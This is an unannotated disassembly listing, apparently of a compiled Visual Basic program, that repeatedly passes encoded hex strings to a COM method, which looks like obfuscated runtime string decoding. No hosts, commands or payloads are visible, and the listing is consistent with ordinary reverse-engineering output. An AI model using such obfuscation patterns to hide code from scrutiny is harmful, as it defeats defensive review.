.text:0040B2CD                 push    eax
.text:0040B2CE                 push    offset aQc8bdbdc4ab ; "qc8bdbdc4ab"
.text:0040B2D3                 mov     eax, [ebp+var_1C]
.text:0040B2D6                 mov     eax, [eax]
.text:0040B2D8                 push    [ebp+var_1C]
.text:0040B2DB                 call    dword ptr [eax+24h]
.text:0040B2DE                 fnclex
.text:0040B2E0                 mov     [ebp+var_20], eax
.text:0040B2E3                 cmp     [ebp+var_20], 0
.text:0040B2E7                 jge     short loc_40B303
.text:0040B2E9                 push    24h ; '$'
.text:0040B2EB                 push    offset dword_4027CC
.text:0040B2F0                 push    [ebp+var_1C]
.text:0040B2F3                 push    [ebp+var_20]
.text:0040B2F6                 call    __vbaHresultCheckObj
.text:0040B2FB                 mov     [ebp+var_100], eax
.text:0040B301                 jmp     short loc_40B30A
.text:0040B303 ; ---------------------------------------------------------------------------
.text:0040B303
.text:0040B303 loc_40B303:                             ; CODE XREF: sub_40A806+AE1↑j
.text:0040B303                 and     [ebp+var_100], 0
.text:0040B30A
.text:0040B30A loc_40B30A:                             ; CODE XREF: sub_40A806+AFB↑j
.text:0040B30A                 mov     eax, [ebp+var_14]
.text:0040B30D                 mov     [ebp+var_68], eax
.text:0040B310                 and     [ebp+var_14], 0
.text:0040B314                 mov     edx, [ebp+var_68]
.text:0040B317                 mov     ecx, offset dword_40E088
.text:0040B31C                 call    __vbaStrMove
.text:0040B321                 cmp     dword_40E0AC, 0
.text:0040B328                 jnz     short loc_40B345
.text:0040B32A                 push    offset dword_40E0AC
.text:0040B32F                 push    offset dword_401960
.text:0040B334                 call    __vbaNew2
.text:0040B339                 mov     [ebp+var_104], offset dword_40E0AC
.text:0040B343                 jmp     short loc_40B34F
.text:0040B345 ; ---------------------------------------------------------------------------
.text:0040B345
.text:0040B345 loc_40B345:                             ; CODE XREF: sub_40A806+B22↑j
.text:0040B345                 mov     [ebp+var_104], offset dword_40E0AC
.text:0040B34F
.text:0040B34F loc_40B34F:                             ; CODE XREF: sub_40A806+B3D↑j
.text:0040B34F                 mov     eax, [ebp+var_104]
.text:0040B355                 mov     eax, [eax]
.text:0040B357                 mov     [ebp+var_1C], eax
.text:0040B35A                 fld     ds:flt_4011FC
.text:0040B360                 fstp    [ebp+var_18]
.text:0040B363                 lea     eax, [ebp+var_14]
.text:0040B366                 push    eax
.text:0040B367                 push    0
.text:0040B369                 lea     eax, [ebp+var_18]
.text:0040B36C                 push    eax
.text:0040B36D                 push    offset aMbfbcb4a3 ; "Mbfbcb4a3"
.text:0040B372                 mov     eax, [ebp+var_1C]
.text:0040B375                 mov     eax, [eax]
.text:0040B377                 push    [ebp+var_1C]
.text:0040B37A                 call    dword ptr [eax+24h]
.text:0040B37D                 fnclex
.text:0040B37F                 mov     [ebp+var_20], eax
.text:0040B382                 cmp     [ebp+var_20], 0
.text:0040B386                 jge     short loc_40B3A2
.text:0040B388                 push    24h ; '$'
.text:0040B38A                 push    offset dword_4027CC
.text:0040B38F                 push    [ebp+var_1C]
.text:0040B392                 push    [ebp+var_20]
.text:0040B395                 call    __vbaHresultCheckObj
.text:0040B39A                 mov     [ebp+var_108], eax
.text:0040B3A0                 jmp     short loc_40B3A9
.text:0040B3A2 ; ---------------------------------------------------------------------------
.text:0040B3A2
.text:0040B3A2 loc_40B3A2:                             ; CODE XREF: sub_40A806+B80↑j
.text:0040B3A2                 and     [ebp+var_108], 0
.text:0040B3A9
.text:0040B3A9 loc_40B3A9:                             ; CODE XREF: sub_40A806+B9A↑j
.text:0040B3A9                 mov     eax, [ebp+var_14]
.text:0040B3AC                 mov     [ebp+var_6C], eax
.text:0040B3AF                 and     [ebp+var_14], 0
.text:0040B3B3                 mov     edx, [ebp+var_6C]
.text:0040B3B6                 mov     ecx, offset unk_40E074
.text:0040B3BB                 call    __vbaStrMove
.text:0040B3C0                 cmp     dword_40E0AC, 0
.text:0040B3C7                 jnz     short loc_40B3E4
.text:0040B3C9                 push    offset dword_40E0AC
.text:0040B3CE                 push    offset dword_401960
.text:0040B3D3                 call    __vbaNew2
.text:0040B3D8                 mov     [ebp+var_10C], offset dword_40E0AC
.text:0040B3E2                 jmp     short loc_40B3EE
.text:0040B3E4 ; ---------------------------------------------------------------------------
.text:0040B3E4
.text:0040B3E4 loc_40B3E4:                             ; CODE XREF: sub_40A806+BC1↑j
.text:0040B3E4                 mov     [ebp+var_10C], offset dword_40E0AC
.text:0040B3EE
.text:0040B3EE loc_40B3EE:                             ; CODE XREF: sub_40A806+BDC↑j
.text:0040B3EE                 mov     eax, [ebp+var_10C]
.text:0040B3F4                 mov     eax, [eax]
.text:0040B3F6                 mov     [ebp+var_1C], eax
.text:0040B3F9                 fld     ds:flt_4011D0
.text:0040B3FF                 fstp    [ebp+var_18]
.text:0040B402                 lea     eax, [ebp+var_14]
.text:0040B405                 push    eax
.text:0040B406                 push    0
.text:0040B408                 lea     eax, [ebp+var_18]
.text:0040B40B                 push    eax
.text:0040B40C                 push    offset aK89998f999a8b9 ; "K89998f999a8b999b8f8e988b9b8b9c8b8c868f"...
.text:0040B411                 mov     eax, [ebp+var_1C]
.text:0040B414                 mov     eax, [eax]
.text:0040B416                 push    [ebp+var_1C]
.text:0040B419                 call    dword ptr [eax+24h]
.text:0040B41C                 fnclex
.text:0040B41E                 mov     [ebp+var_20], eax
.text:0040B421                 cmp     [ebp+var_20], 0
.text:0040B425                 jge     short loc_40B441
.text:0040B427                 push    24h ; '$'
.text:0040B429                 push    offset dword_4027CC
.text:0040B42E                 push    [ebp+var_1C]
.text:0040B431                 push    [ebp+var_20]
.text:0040B434                 call    __vbaHresultCheckObj
.text:0040B439                 mov     [ebp+var_110], eax
.text:0040B43F                 jmp     short loc_40B448
.text:0040B441 ; ---------------------------------------------------------------------------
.text:0040B441
.text:0040B441 loc_40B441:                             ; CODE XREF: sub_40A806+C1F↑j
.text:0040B441                 and     [ebp+var_110], 0
.text:0040B448
.text:0040B448 loc_40B448:                             ; CODE XREF: sub_40A806+C39↑j
.text:0040B448                 mov     eax, [ebp+var_14]
.text:0040B44B                 mov     [ebp+var_70], eax
.text:0040B44E                 and     [ebp+var_14], 0
.text:0040B452                 mov     edx, [ebp+var_70]
.text:0040B455                 mov     ecx, offset dword_40E0B8
.text:0040B45A                 call    __vbaStrMove
.text:0040B45F                 call    sub_40B485
.text:0040B464                 wait
.text:0040B465                 push    offset loc_40B476
.text:0040B46A                 jmp     short loc_40B475
.text:0040B46C ; ---------------------------------------------------------------------------
.text:0040B46C
.text:0040B46C loc_40B46C:                             ; DATA XREF: .text:004012CC↑o
.text:0040B46C                 lea     ecx, [ebp+var_14]
.text:0040B46F                 call    __vbaFreeStr
.text:0040B474                 retn
.text:0040B475 ; ---------------------------------------------------------------------------
.text:0040B475
.text:0040B475 loc_40B475:                             ; CODE XREF: sub_40A806+C64↑j
.text:0040B475                 retn
.text:0040B476 ; ---------------------------------------------------------------------------
.text:0040B476
.text:0040B476 loc_40B476:                             ; CODE XREF: sub_40A806:loc_40B475↑j
.text:0040B476                                         ; DATA XREF: sub_40A806+C5F↑o
.text:0040B476                 mov     ecx, [ebp+var_10]
.text:0040B479                 mov     large fs:0, ecx
.text:0040B480                 pop     edi
.text:0040B481                 pop     esi
.text:0040B482                 pop     ebx
.text:0040B483                 leave
.text:0040B484                 retn
.text:0040B484 sub_40A806      endp ; sp-analysis failed
.text:0040B484
.text:0040B485
.text:0040B485 ; =============== S U B R O U T I N E =======================================
.text:0040B485
.text:0040B485 ; Attributes: bp-based frame
.text:0040B485
.text:0040B485 sub_40B485      proc near               ; CODE XREF: sub_40A806+C59↑p
.text:0040B485
.text:0040B485 var_9C          = dword ptr -9Ch
.text:0040B485 var_98          = dword ptr -98h
.text:0040B485 var_94          = dword ptr -94h
.text:0040B485 var_90          = dword ptr -90h
.text:0040B485 var_8C          = dword ptr -8Ch
.text:0040B485 var_88          = dword ptr -88h
.text:0040B485 var_84          = dword ptr -84h
.text:0040B485 var_80          = dword ptr -80h
.text:0040B485 var_7C          = dword ptr -7Ch
.text:0040B485 var_78          = dword ptr -78h
.text:0040B485 var_74          = dword ptr -74h
.text:0040B485 var_70          = dword ptr -70h
.text:0040B485 var_6C          = dword ptr -6Ch
.text:0040B485 var_68          = dword ptr -68h
.text:0040B485 var_64          = dword ptr -64h
.text:0040B485 var_60          = dword ptr -60h
.text:0040B485 var_5C          = dword ptr -5Ch
.text:0040B485 var_58          = dword ptr -58h
.text:0040B485 var_54          = dword ptr -54h
.text:0040B485 var_50          = dword ptr -50h
.text:0040B485 var_4C          = dword ptr -4Ch
.text:0040B485 var_48          = dword ptr -48h
.text:0040B485 var_44          = dword ptr -44h
.text:0040B485 var_40          = dword ptr -40h
.text:0040B485 var_3C          = dword ptr -3Ch
.text:0040B485 var_38          = dword ptr -38h
.text:0040B485 var_34          = dword ptr -34h
.text:0040B485 var_30          = dword ptr -30h
.text:0040B485 var_2C          = dword ptr -2Ch
.text:0040B485 var_28          = dword ptr -28h
.text:0040B485 var_20          = dword ptr -20h
.text:0040B485 var_1C          = dword ptr -1Ch
.text:0040B485 var_18          = dword ptr -18h
.text:0040B485 var_14          = dword ptr -14h
.text:0040B485 var_10          = dword ptr -10h
.text:0040B485 var_8           = dword ptr -8
.text:0040B485 var_4           = dword ptr -4
.text:0040B485
.text:0040B485                 push    ebp
.text:0040B486                 mov     ebp, esp
.text:0040B488                 push    ecx
.text:0040B489                 push    ecx
.text:0040B48A                 push    offset __vbaExceptHandler
.text:0040B48F                 mov     eax, large fs:0
.text:0040B495                 push    eax
.text:0040B496                 mov     large fs:0, esp
.text:0040B49D                 mov     eax, 8Ch
.text:0040B4A2                 call    __vbaChkstk
.text:0040B4A7                 push    ebx
.text:0040B4A8                 push    esi
.text:0040B4A9                 push    edi
.text:0040B4AA                 mov     [ebp+var_8], esp
.text:0040B4AD                 mov     [ebp+var_4], offset dword_4012E0
.text:0040B4B4                 cmp     dword_40E0AC, 0
.text:0040B4BB                 jnz     short loc_40B4D5
.text:0040B4BD                 push    offset dword_40E0AC
.text:0040B4C2                 push    offset dword_401960
.text:0040B4C7                 call    __vbaNew2
.text:0040B4CC                 mov     [ebp+var_50], offset dword_40E0AC
.text:0040B4D3                 jmp     short loc_40B4DC
.text:0040B4D5 ; ---------------------------------------------------------------------------
.text:0040B4D5
.text:0040B4D5 loc_40B4D5:                             ; CODE XREF: sub_40B485+36↑j
.text:0040B4D5                 mov     [ebp+var_50], offset dword_40E0AC
.text:0040B4DC
.text:0040B4DC loc_40B4DC:                             ; CODE XREF: sub_40B485+4E↑j
.text:0040B4DC                 mov     eax, [ebp+var_50]
.text:0040B4DF                 mov     eax, [eax]
.text:0040B4E1                 mov     [ebp+var_1C], eax
.text:0040B4E4                 fld     ds:flt_4011B8
.text:0040B4EA                 fstp    [ebp+var_18]
.text:0040B4ED                 lea     eax, [ebp+var_14]
.text:0040B4F0                 push    eax
.text:0040B4F1                 push    0
.text:0040B4F3                 lea     eax, [ebp+var_18]
.text:0040B4F6                 push    eax
.text:0040B4F7                 push    offset aK867885 ; "K867885"
.text:0040B4FC                 mov     eax, [ebp+var_1C]
.text:0040B4FF                 mov     eax, [eax]
.text:0040B501                 push    [ebp+var_1C]
.text:0040B504                 call    dword ptr [eax+24h]
.text:0040B507                 fnclex
.text:0040B509                 mov     [ebp+var_20], eax
.text:0040B50C                 cmp     [ebp+var_20], 0
.text:0040B510                 jge     short loc_40B529
.text:0040B512                 push    24h ; '$'
.text:0040B514                 push    offset dword_4027CC
.text:0040B519                 push    [ebp+var_1C]
.text:0040B51C                 push    [ebp+var_20]
.text:0040B51F                 call    __vbaHresultCheckObj
.text:0040B524                 mov     [ebp+var_54], eax
.text:0040B527                 jmp     short loc_40B52D
.text:0040B529 ; ---------------------------------------------------------------------------
.text:0040B529
.text:0040B529 loc_40B529:                             ; CODE XREF: sub_40B485+8B↑j
.text:0040B529                 and     [ebp+var_54], 0
.text:0040B52D
.text:0040B52D loc_40B52D:                             ; CODE XREF: sub_40B485+A2↑j
.text:0040B52D                 mov     eax, [ebp+var_14]
.text:0040B530                 mov     [ebp+var_28], eax
.text:0040B533                 and     [ebp+var_14], 0
.text:0040B537                 mov     edx, [ebp+var_28]
.text:0040B53A                 mov     ecx, offset dword_40E10C
.text:0040B53F                 call    __vbaStrMove
.text:0040B544                 cmp     dword_40E0AC, 0
.text:0040B54B                 jnz     short loc_40B565
.text:0040B54D                 push    offset dword_40E0AC
.text:0040B552                 push    offset dword_401960
.text:0040B557                 call    __vbaNew2
.text:0040B55C                 mov     [ebp+var_58], offset dword_40E0AC
.text:0040B563                 jmp     short loc_40B56C
.text:0040B565 ; ---------------------------------------------------------------------------
.text:0040B565
.text:0040B565 loc_40B565:                             ; CODE XREF: sub_40B485+C6↑j
.text:0040B565                 mov     [ebp+var_58], offset dword_40E0AC
.text:0040B56C
.text:0040B56C loc_40B56C:                             ; CODE XREF: sub_40B485+DE↑j
.text:0040B56C                 mov     eax, [ebp+var_58]
.text:0040B56F                 mov     eax, [eax]
.text:0040B571                 mov     [ebp+var_1C], eax
.text:0040B574                 fld     ds:flt_4012A0
.text:0040B57A                 fstp    [ebp+var_18]
.text:0040B57D                 lea     eax, [ebp+var_14]
.text:0040B580                 push    eax
.text:0040B581                 push    0
.text:0040B583                 lea     eax, [ebp+var_18]
.text:0040B586                 push    eax
.text:0040B587                 push    offset aU59918a7986815 ; "U59918a7986815a876c7f86818a8c6b8c88918a"...
.text:0040B58C                 mov     eax, [ebp+var_1C]
.text:0040B58F                 mov     eax, [eax]
.text:0040B591                 push    [ebp+var_1C]
.text:0040B594                 call    dword ptr [eax+24h]
.text:0040B597                 fnclex
.text:0040B599                 mov     [ebp+var_20], eax
.text:0040B59C                 cmp     [ebp+var_20], 0
.text:0040B5A0                 jge     short loc_40B5B9
.text:0040B5A2                 push    24h ; '$'
.text:0040B5A4                 push    offset dword_4027CC
.text:0040B5A9                 push    [ebp+var_1C]
.text:0040B5AC                 push    [ebp+var_20]
.text:0040B5AF                 call    __vbaHresultCheckObj
.text:0040B5B4                 mov     [ebp+var_5C], eax
.text:0040B5B7                 jmp     short loc_40B5BD
.text:0040B5B9 ; ---------------------------------------------------------------------------
.text:0040B5B9
.text:0040B5B9 loc_40B5B9:                             ; CODE XREF: sub_40B485+11B↑j
.text:0040B5B9                 and     [ebp+var_5C], 0
.text:0040B5BD
.text:0040B5BD loc_40B5BD:                             ; CODE XREF: sub_40B485+132↑j
.text:0040B5BD                 mov     eax, [ebp+var_14]
.text:0040B5C0                 mov     [ebp+var_2C], eax
.text:0040B5C3                 and     [ebp+var_14], 0
.text:0040B5C7                 mov     edx, [ebp+var_2C]
.text:0040B5CA                 mov     ecx, offset dword_40E130
.text:0040B5CF                 call    __vbaStrMove
.text:0040B5D4                 cmp     dword_40E0AC, 0
.text:0040B5DB                 jnz     short loc_40B5F5
.text:0040B5DD                 push    offset dword_40E0AC
.text:0040B5E2                 push    offset dword_401960
.text:0040B5E7                 call    __vbaNew2
.text:0040B5EC                 mov     [ebp+var_60], offset dword_40E0AC
.text:0040B5F3                 jmp     short loc_40B5FC
.text:0040B5F5 ; ---------------------------------------------------------------------------
.text:0040B5F5
.text:0040B5F5 loc_40B5F5:                             ; CODE XREF: sub_40B485+156↑j
.text:0040B5F5                 mov     [ebp+var_60], offset dword_40E0AC
.text:0040B5FC
.text:0040B5FC loc_40B5FC:                             ; CODE XREF: sub_40B485+16E↑j
.text:0040B5FC                 mov     eax, [ebp+var_60]
.text:0040B5FF                 mov     eax, [eax]
.text:0040B601                 mov     [ebp+var_1C], eax
.text:0040B604                 fld     ds:flt_40129C
.text:0040B60A                 fstp    [ebp+var_18]
.text:0040B60D                 lea     eax, [ebp+var_14]
.text:0040B610                 push    eax
.text:0040B611                 push    0
.text:0040B613                 lea     eax, [ebp+var_18]
.text:0040B616                 push    eax
.text:0040B617                 push    offset aM7b7b73837d ; "M7b7b73837d"
.text:0040B61C                 mov     eax, [ebp+var_1C]
.text:0040B61F                 mov     eax, [eax]
.text:0040B621                 push    [ebp+var_1C]
.text:0040B624                 call    dword ptr [eax+24h]
.text:0040B627                 fnclex
.text:0040B629                 mov     [ebp+var_20], eax
.text:0040B62C                 cmp     [ebp+var_20], 0
.text:0040B630                 jge     short loc_40B649
.text:0040B632                 push    24h ; '$'
.text:0040B634                 push    offset dword_4027CC
.text:0040B639                 push    [ebp+var_1C]
.text:0040B63C                 push    [ebp+var_20]
.text:0040B63F                 call    __vbaHresultCheckObj
.text:0040B644                 mov     [ebp+var_64], eax
.text:0040B647                 jmp     short loc_40B64D
.text:0040B649 ; ---------------------------------------------------------------------------
.text:0040B649
.text:0040B649 loc_40B649:                             ; CODE XREF: sub_40B485+1AB↑j
.text:0040B649                 and     [ebp+var_64], 0
.text:0040B64D
.text:0040B64D loc_40B64D:                             ; CODE XREF: sub_40B485+1C2↑j
.text:0040B64D                 mov     eax, [ebp+var_14]
.text:0040B650                 mov     [ebp+var_30], eax
.text:0040B653                 and     [ebp+var_14], 0
.text:0040B657                 mov     edx, [ebp+var_30]
.text:0040B65A                 mov     ecx, offset dword_40E144
.text:0040B65F                 call    __vbaStrMove
.text:0040B664                 cmp     dword_40E0AC, 0
.text:0040B66B                 jnz     short loc_40B685
.text:0040B66D                 push    offset dword_40E0AC
.text:0040B672                 push    offset dword_401960
.text:0040B677                 call    __vbaNew2
.text:0040B67C                 mov     [ebp+var_68], offset dword_40E0AC
.text:0040B683                 jmp     short loc_40B68C
.text:0040B685 ; ---------------------------------------------------------------------------
.text:0040B685
.text:0040B685 loc_40B685:                             ; CODE XREF: sub_40B485+1E6↑j
.text:0040B685                 mov     [ebp+var_68], offset dword_40E0AC
.text:0040B68C
.text:0040B68C loc_40B68C:                             ; CODE XREF: sub_40B485+1FE↑j
.text:0040B68C                 mov     eax, [ebp+var_68]
.text:0040B68F                 mov     eax, [eax]
.text:0040B691                 mov     [ebp+var_1C], eax
.text:0040B694                 fld     ds:flt_4011D4
.text:0040B69A                 fstp    [ebp+var_18]
.text:0040B69D                 lea     eax, [ebp+var_14]
.text:0040B6A0                 push    eax
.text:0040B6A1                 push    0
.text:0040B6A3                 lea     eax, [ebp+var_18]
.text:0040B6A6                 push    eax
.text:0040B6A7                 push    offset aIaccec7b6c7b7b ; "iaccec7b6c7b7bea1b9b6c4a1"
.text:0040B6AC                 mov     eax, [ebp+var_1C]
.text:0040B6AF                 mov     eax, [eax]
.text:0040B6B1                 push    [ebp+var_1C]
.text:0040B6B4                 call    dword ptr [eax+24h]
.text:0040B6B7                 fnclex
.text:0040B6B9                 mov     [ebp+var_20], eax
.text:0040B6BC                 cmp     [ebp+var_20], 0
.text:0040B6C0                 jge     short loc_40B6D9
.text:0040B6C2                 push    24h ; '$'
.text:0040B6C4                 push    offset dword_4027CC
.text:0040B6C9                 push    [ebp+var_1C]
.text:0040B6CC                 push    [ebp+var_20]
.text:0040B6CF                 call    __vbaHresultCheckObj
.text:0040B6D4                 mov     [ebp+var_6C], eax
.text:0040B6D7                 jmp     short loc_40B6DD
.text:0040B6D9 ; ---------------------------------------------------------------------------
.text:0040B6D9
.text:0040B6D9 loc_40B6D9:                             ; CODE XREF: sub_40B485+23B↑j
.text:0040B6D9                 and     [ebp+var_6C], 0
.text:0040B6DD
.text:0040B6DD loc_40B6DD:                             ; CODE XREF: sub_40B485+252↑j
.text:0040B6DD                 mov     eax, [ebp+var_14]
.text:0040B6E0                 mov     [ebp+var_34], eax
.text:0040B6E3                 and     [ebp+var_14], 0
.text:0040B6E7                 mov     edx, [ebp+var_34]
.text:0040B6EA                 mov     ecx, offset dword_40E138
.text:0040B6EF                 call    __vbaStrMove
.text:0040B6F4                 cmp     dword_40E0AC, 0
.text:0040B6FB                 jnz     short loc_40B715
.text:0040B6FD                 push    offset dword_40E0AC
.text:0040B702                 push    offset dword_401960
.text:0040B707                 call    __vbaNew2
.text:0040B70C                 mov     [ebp+var_70], offset dword_40E0AC
.text:0040B713                 jmp     short loc_40B71C
.text:0040B715 ; ---------------------------------------------------------------------------
.text:0040B715
.text:0040B715 loc_40B715:                             ; CODE XREF: sub_40B485+276↑j
.text:0040B715                 mov     [ebp+var_70], offset dword_40E0AC
.text:0040B71C
.text:0040B71C loc_40B71C:                             ; CODE XREF: sub_40B485+28E↑j
.text:0040B71C                 mov     eax, [ebp+var_70]
.text:0040B71F                 mov     eax, [eax]
.text:0040B721                 mov     [ebp+var_1C], eax
.text:0040B724                 fld     ds:flt_4012D8
.text:0040B72A                 fstp    [ebp+var_18]
.text:0040B72D                 lea     eax, [ebp+var_14]
.text:0040B730                 push    eax
.text:0040B731                 push    0
.text:0040B733                 lea     eax, [ebp+var_18]
.text:0040B736                 push    eax
.text:0040B737                 push    offset aA1c28fafadbcbf ; ",a1c28fafadbcbfb9bdaf9caeb8b390"
.text:0040B73C                 mov     eax, [ebp+var_1C]
.text:0040B73F                 mov     eax, [eax]
.text:0040B741                 push    [ebp+var_1C]
.text:0040B744                 call    dword ptr [eax+24h]
.text:0040B747                 fnclex
.text:0040B749                 mov     [ebp+var_20], eax
.text:0040B74C                 cmp     [ebp+var_20], 0
.text:0040B750                 jge     short loc_40B769
.text:0040B752                 push    24h ; '$'
.text:0040B754                 push    offset dword_4027CC
.text:0040B759                 push    [ebp+var_1C]
.text:0040B75C                 push    [ebp+var_20]
.text:0040B75F                 call    __vbaHresultCheckObj
.text:0040B764                 mov     [ebp+var_74], eax
.text:0040B767                 jmp     short loc_40B76D
.text:0040B769 ; ---------------------------------------------------------------------------
.text:0040B769
.text:0040B769 loc_40B769:                             ; CODE XREF: sub_40B485+2CB↑j
.text:0040B769                 and     [ebp+var_74], 0
.text:0040B76D
.text:0040B76D loc_40B76D:                             ; CODE XREF: sub_40B485+2E2↑j
.text:0040B76D                 mov     eax, [ebp+var_14]
.text:0040B770                 mov     [ebp+var_38], eax
.text:0040B773                 and     [ebp+var_14], 0
.text:0040B777                 mov     edx, [ebp+var_38]
.text:0040B77A                 mov     ecx, offset dword_40E120
.text:0040B77F                 call    __vbaStrMove
.text:0040B784                 cmp     dword_40E0AC, 0
.text:0040B78B                 jnz     short loc_40B7A5
.text:0040B78D                 push    offset dword_40E0AC
.text:0040B792                 push    offset dword_401960
.text:0040B797                 call    __vbaNew2
.text:0040B79C                 mov     [ebp+var_78], offset dword_40E0AC
.text:0040B7A3                 jmp     short loc_40B7AC
.text:0040B7A5 ; ---------------------------------------------------------------------------
.text:0040B7A5
.text:0040B7A5 loc_40B7A5:                             ; CODE XREF: sub_40B485+306↑j
.text:0040B7A5                 mov     [ebp+var_78], offset dword_40E0AC
.text:0040B7AC
.text:0040B7AC loc_40B7AC:                             ; CODE XREF: sub_40B485+31E↑j
.text:0040B7AC                 mov     eax, [ebp+var_78]
.text:0040B7AF                 mov     eax, [eax]
.text:0040B7B1                 mov     [ebp+var_1C], eax
.text:0040B7B4                 fld     ds:flt_4012D4
.text:0040B7BA                 fstp    [ebp+var_18]
.text:0040B7BD                 lea     eax, [ebp+var_14]
.text:0040B7C0                 push    eax
.text:0040B7C1                 push    0
.text:0040B7C3                 lea     eax, [ebp+var_18]
.text:0040B7C6                 push    eax
.text:0040B7C7                 push    offset aQb3b1c0c3bdc1b ; "Qb3b1c0c3bdc1b3a0b2afbd9a"
.text:0040B7CC                 mov     eax, [ebp+var_1C]
.text:0040B7CF                 mov     eax, [eax]
.text:0040B7D1                 push    [ebp+var_1C]
.text:0040B7D4                 call    dword ptr [eax+24h]
.text:0040B7D7                 fnclex
.text:0040B7D9                 mov     [ebp+var_20], eax
.text:0040B7DC                 cmp     [ebp+var_20], 0
.text:0040B7E0                 jge     short loc_40B7F9
.text:0040B7E2                 push    24h ; '$'
.text:0040B7E4                 push    offset dword_4027CC
.text:0040B7E9                 push    [ebp+var_1C]
.text:0040B7EC                 push    [ebp+var_20]
.text:0040B7EF                 call    __vbaHresultCheckObj
.text:0040B7F4                 mov     [ebp+var_7C], eax
.text:0040B7F7                 jmp     short loc_40B7FD
.text:0040B7F9 ; ---------------------------------------------------------------------------
.text:0040B7F9
.text:0040B7F9 loc_40B7F9:                             ; CODE XREF: sub_40B485+35B↑j
.text:0040B7F9                 and     [ebp+var_7C], 0
.text:0040B7FD
.text:0040B7FD loc_40B7FD:                             ; CODE XREF: sub_40B485+372↑j
.text:0040B7FD                 mov     eax, [ebp+var_14]
.text:0040B800                 mov     [ebp+var_3C], eax
.text:0040B803                 and     [ebp+var_14], 0
.text:0040B807                 mov     edx, [ebp+var_3C]
.text:0040B80A                 mov     ecx, offset dword_40E118
.text:0040B80F                 call    __vbaStrMove
.text:0040B814                 cmp     dword_40E0AC, 0
.text:0040B81B                 jnz     short loc_40B835
.text:0040B81D                 push    offset dword_40E0AC
.text:0040B822                 push    offset dword_401960
.text:0040B827                 call    __vbaNew2
.text:0040B82C                 mov     [ebp+var_80], offset dword_40E0AC
.text:0040B833                 jmp     short loc_40B83C
.text:0040B835 ; ---------------------------------------------------------------------------
.text:0040B835
.text:0040B835 loc_40B835:                             ; CODE XREF: sub_40B485+396↑j
.text:0040B835                 mov     [ebp+var_80], offset dword_40E0AC
.text:0040B83C
.text:0040B83C loc_40B83C:                             ; CODE XREF: sub_40B485+3AE↑j
.text:0040B83C                 mov     eax, [ebp+var_80]
.text:0040B83F                 mov     eax, [eax]
.text:0040B841                 mov     [ebp+var_1C], eax
.text:0040B844                 fld     ds:flt_40121C
.text:0040B84A                 fstp    [ebp+var_18]
.text:0040B84D                 lea     eax, [ebp+var_14]
.text:0040B850                 push    eax
.text:0040B851                 push    0
.text:0040B853                 lea     eax, [ebp+var_18]
.text:0040B856                 push    eax
.text:0040B857                 push    offset aV9386878796639 ; "V93868787966394948693918e908486658d9573"
.text:0040B85C                 mov     eax, [ebp+var_1C]
.text:0040B85F                 mov     eax, [eax]
.text:0040B861                 push    [ebp+var_1C]
.text:0040B864                 call    dword ptr [eax+24h]
.text:0040B867                 fnclex
.text:0040B869                 mov     [ebp+var_20], eax
.text:0040B86C                 cmp     [ebp+var_20], 0
.text:0040B870                 jge     short loc_40B88C
.text:0040B872                 push    24h ; '$'
.text:0040B874                 push    offset dword_4027CC
.text:0040B879                 push    [ebp+var_1C]
.text:0040B87C                 push    [ebp+var_20]
.text:0040B87F                 call    __vbaHresultCheckObj
.text:0040B884                 mov     [ebp+var_84], eax
.text:0040B88A                 jmp     short loc_40B893
.text:0040B88C ; ---------------------------------------------------------------------------
.text:0040B88C
.text:0040B88C loc_40B88C:                             ; CODE XREF: sub_40B485+3EB↑j
.text:0040B88C                 and     [ebp+var_84], 0
.text:0040B893
.text:0040B893 loc_40B893:                             ; CODE XREF: sub_40B485+405↑j
.text:0040B893                 mov     eax, [ebp+var_14]
.text:0040B896                 mov     [ebp+var_40], eax
.text:0040B899                 and     [ebp+var_14], 0
.text:0040B89D                 mov     edx, [ebp+var_40]
.text:0040B8A0                 mov     ecx, offset dword_40E114
.text:0040B8A5                 call    __vbaStrMove
.text:0040B8AA                 cmp     dword_40E0AC, 0
.text:0040B8B1                 jnz     short loc_40B8CE
.text:0040B8B3                 push    offset dword_40E0AC
.text:0040B8B8                 push    offset dword_401960
.text:0040B8BD                 call    __vbaNew2
.text:0040B8C2                 mov     [ebp+var_88], offset dword_40E0AC
.text:0040B8CC                 jmp     short loc_40B8D8
.text:0040B8CE ; ---------------------------------------------------------------------------
.text:0040B8CE
.text:0040B8CE loc_40B8CE:                             ; CODE XREF: sub_40B485+42C↑j
.text:0040B8CE                 mov     [ebp+var_88], offset dword_40E0AC
.text:0040B8D8
.text:0040B8D8 loc_40B8D8:                             ; CODE XREF: sub_40B485+447↑j
.text:0040B8D8                 mov     eax, [ebp+var_88]
.text:0040B8DE                 mov     eax, [eax]
.text:0040B8E0                 mov     [ebp+var_1C], eax
.text:0040B8E3                 fld     ds:flt_401220
.text:0040B8E9                 fstp    [ebp+var_18]
.text:0040B8EC                 lea     eax, [ebp+var_14]
.text:0040B8EF                 push    eax
.text:0040B8F0                 push    0
.text:0040B8F2                 lea     eax, [ebp+var_18]
.text:0040B8F5                 push    eax
.text:0040B8F6                 push    offset aNb2b0bfc2bcc0b ; "nb2b0bfc2bcc0b29fb8b0bc99"
.text:0040B8FB                 mov     eax, [ebp+var_1C]
.text:0040B8FE                 mov     eax, [eax]
.text:0040B900                 push    [ebp+var_1C]
.text:0040B903                 call    dword ptr [eax+24h]
.text:0040B906                 fnclex
.text:0040B908                 mov     [ebp+var_20], eax
.text:0040B90B                 cmp     [ebp+var_20], 0
.text:0040B90F                 jge     short loc_40B92B
.text:0040B911                 push    24h ; '$'
.text:0040B913                 push    offset dword_4027CC
.text:0040B918                 push    [ebp+var_1C]
.text:0040B91B                 push    [ebp+var_20]
.text:0040B91E                 call    __vbaHresultCheckObj
.text:0040B923                 mov     [ebp+var_8C], eax
.text:0040B929                 jmp     short loc_40B932
.text:0040B92B ; ---------------------------------------------------------------------------
.text:0040B92B
.text:0040B92B loc_40B92B:                             ; CODE XREF: sub_40B485+48A↑j
.text:0040B92B                 and     [ebp+var_8C], 0
.text:0040B932
.text:0040B932 loc_40B932:                             ; CODE XREF: sub_40B485+4A4↑j
.text:0040B932                 mov     eax, [ebp+var_14]
.text:0040B935                 mov     [ebp+var_44], eax
.text:0040B938                 and     [ebp+var_14], 0
.text:0040B93C                 mov     edx, [ebp+var_44]
.text:0040B93F                 mov     ecx, offset dword_40E104
.text:0040B944                 call    __vbaStrMove
.text:0040B949                 cmp     dword_40E0AC, 0
.text:0040B950                 jnz     short loc_40B96D
.text:0040B952                 push    offset dword_40E0AC
.text:0040B957                 push    offset dword_401960
.text:0040B95C                 call    __vbaNew2
